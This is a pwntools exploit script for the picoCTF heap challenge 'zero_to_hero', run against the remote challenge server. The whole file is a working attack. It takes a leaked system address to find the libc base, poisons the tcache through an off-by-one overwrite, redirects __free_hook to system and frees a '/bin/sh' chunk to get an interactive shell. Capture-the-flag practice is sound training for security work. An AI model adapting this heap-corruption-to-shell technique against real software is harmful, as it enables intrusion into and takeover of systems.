from pwn import *
context.log_level='debug'
libc=ELF('./libc.so.6')
#r = process('./zero_to_hero')
#r=gdb.debug('./zero_to_hero', 'b *0x00400997\nc')
r = remote('jupiter.challenges.picoctf.org', 10089)
r.sendline(b'yes')
r.recvuntil(b': ')
system_addr = int(r.recvline(), 16)
libc.address = system_addr - libc.sym['system']
def add(l,d):
	r.recvuntil(b'> ')
	r.sendline(b'1')
	r.recvuntil(b'> ')
	r.sendline(str(l).encode())
	r.recvuntil(b'> ')
	r.sendline(d)
def remove(i):
	r.recvuntil(b'> ')
	r.sendline(b'2')
	r.recvuntil(b'> ')
	r.sendline(str(i).encode())
add(0x28,b'a')
add(0x110,b'a')
remove(0)
remove(1)
add(0x28,b'a'*0x28)
remove(1)

print('__free_hook @', libc.sym['__free_hook'])
add(0xf0, p64(libc.sym['__free_hook']))
add(0x110, b'/bin/sh\x00')
add(0x110, p64(libc.sym['system']))
remove(4)

# pray for shell
r.interactive()

